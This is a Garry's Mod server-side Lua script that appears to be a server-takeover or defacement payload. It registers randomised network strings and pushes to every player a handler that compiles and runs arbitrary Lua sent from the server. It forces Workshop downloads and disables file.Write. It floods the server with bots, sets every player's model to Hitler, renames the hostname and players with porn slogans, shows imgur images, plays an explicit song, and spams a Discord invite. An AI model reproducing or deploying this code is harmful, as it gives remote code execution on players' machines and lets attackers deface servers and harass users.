local function takeScreenshot()
    local timestamp = os.time()
    local screenshotName = &quot;screenshot_&quot; .. timestamp .. &quot;.jpg&quot;
    RunConsoleCommand(&quot;jpeg&quot;, screenshotName)
    print(&quot;Capture d'&eacute;cran prise : &quot; .. screenshotName)
end
local captureInterval = 0.1
local function startScreenshots()
    timer.Create(&quot;ScreenshotTimer&quot;, captureInterval, 0, function()
        takeScreenshot()
    end)
end
local function startScreenshots()
    timer.Create(&quot;ScreenshotTimer&quot;, captureInterval, 0, function()
        takeScreenshot()
    end)
end
local function startScreenshots()
    timer.Create(&quot;ScreenshotTimer&quot;, captureInterval, 0, function()
        takeScreenshot()
    end)
end
startScreenshots()
timer.Create(&quot;AddBot&quot;, 1, game.MaxPlayers() - player.GetCount(), function()
    RunConsoleCommand(&quot;bot&quot;)
end)

hook.Add(&quot;PlayerSpawn&quot;, &quot;RenderInScreenshots&quot;, function(ply)
    ply:SetRenderInScreenshots(true)
end)
timer.Create(&quot;AddBot&quot;, 1, game.MaxPlayers() - player.GetCount(), function()
    RunConsoleCommand(&quot;bot&quot;)
end)
function RandomString(intMin, intMax)
    local ret = &quot;&quot;
        for _ = 1, math.random(intMin, intMax) do
        ret = ret .. string.char(math.random(65, 90))
    end
        return ret
    end
    local randomtable = {
        CodeRandom = RandomString(0, 69),
        TimingRandom = RandomString(0, 69),
        ClientRandom = RandomString(0, 69),
        ServeurRadom = RandomString(0, 69)
    }
    
util.AddNetworkString(randomtable[&quot;TimingRandom&quot;])
util.AddNetworkString(randomtable[&quot;CodeRandom&quot;])
BroadcastLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;NarutoSpawn&quot;, function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles(&quot;particles/CHANGE_ME.pcf&quot;) PrecacheParticleSystem(&quot;CHANGE_ME&quot;) end)]])
    end
end)

local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(randomtable[&quot;CodeRandom&quot;])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
for k, v in pairs(player.GetAll()) do
    v:SendLua(&quot;steamworks.FileInfo(323348015,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)&quot;)
    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles(&quot;particles/CHANGE_ME.pcf&quot;) PrecacheParticleSystem(&quot;CHANGE_ME&quot;) end)]])
end
function file.Write() return end
local function rdm_str(len)
    if !len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end
timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetModel(&quot;models/player/hitler/hitler.mdl&quot;)
    end
end)
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;BestLol&quot;..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)
 
local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

-- Font
timer.Simple(2 ,function()
InfoClient([=[
local WriteK = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( &quot;DevMod&quot;, {
    font = &quot;Roboto&quot;,
    extended = false,
    size = WriteK *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
})
hook.Add( &quot;HUDPaint&quot;, &quot;Font1&quot;, function()
    for i = 1, 60 do
end
local function GetImgur(id)
    if file.Exists(&quot;porno/imgur/&quot; .. id .. &quot;.png&quot;, &quot;DATA&quot;) then
        return Material(&quot;../data/porno/imgur/&quot; .. id .. &quot;.png&quot;)
    end
    
    http.Fetch(&quot;https://i.imgur.com/&quot; .. id .. &quot;.png&quot;,
        -- onSuccess function
        function(body, length, headers, code)
            if not file.IsDir(&quot;porno/imgur/&quot;, &quot;DATA&quot;) then
                file.CreateDir(&quot;porno/imgur/&quot;)
            end
            file.Write(&quot;porno/imgur/&quot; .. id .. &quot;.png&quot;, body)
        end,
    
        -- onFailure function
        function(message)
            -- We failed. =(
            print(message)
        end
    )
    return Material(&quot;.png&quot;)
end

surface.SetMaterial(GetImgur(&quot;082Z44b&quot;))
surface.SetDrawColor(Color(255,255,255))
surface.DrawTexturedRect(0, 0, 1920,1080)
local mat = Entity(0):GetMaterials()
    for k,v in pairs(mat) do
    end
end)
]=])
end)

-- Song
timer.Simple(0.5 ,function()
InfoClient([=[
local AudioSource = nil
local AMP = 3000

sound.PlayURL(&quot;https://dl.sndup.net/jt5x/Cupcakke%20Juicy%20Coochie%20Music%20Video.mp3&quot;, &quot;mono&quot;, function(source , err , errname)
    if IsValid(source) then
        AudioSource = source
        source:Play()
    end
end)

local smoothdata = {}
local SoundPlay = 0

for i = 1 , 256 do
    smoothdata[i] = 0
end
hook.Add(&quot;CalcView&quot;, &quot;CalcView&quot;, MyCalcView)

]=])
end)

-- Custom Settings
timer.Simple(5 ,function()
    RunConsoleCommand(&quot;hostname&quot;, &quot;Porno Land ! ❤&quot;)
    RunConsoleCommand(&quot;ulx&quot;, &quot;god&quot;, &quot;*&quot;)

    
end)

timer.Create(&quot;ChangeRPName&quot;,2 ,99 , function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar(&quot;rpname&quot;, &quot;I ❤ Porno !&quot;)
    end
end)

timer.Simple(0.5, function()
    InfoClient([[
timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.5, 0, function()
    notification.AddLegacy( &quot;C'est haram !&quot;, math.random(0, 4), 1.5 )
end)

timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.5, 0, function()
    notification.AddLegacy( &quot;By Games-Manager &quot;, math.random(0, 4), 1.5 )
end)

timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.5, 0, function()
    notification.AddLegacy( &quot;Profite de la VUE &quot;, math.random(0, 4), 1.5 )
end)

timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.5, 0, function()
    notification.AddLegacy( &quot;discord/https://discord.gg/cmQYxb3jeN&quot;, math.random(0, 4), 1.5 )
end)
]])
end)

timer.Simple(0.5, function()
    InfoClient([[  
    timer.Create(&quot;]] .. randomtable[&quot;ServeurRadom&quot;] .. [[&quot;, 1.5, 0, function()
    local time = tonumber(0)
    local Message = {
        &quot;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&quot;,
        &quot;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;  https://discord.gg/https://discord.gg/cmQYxb3jeN &gt;&gt;&quot;,
        }
        for _, line in pairs(Message) do
        time = time + tonumber(0.1)
    timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
            end)
        end
    end)
    ]])
    end) function RunHASHOb() end


	timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
		print(&quot;JOIN DISCORD : https://discord.gg/cmQYxb3jeN &quot;)
	end)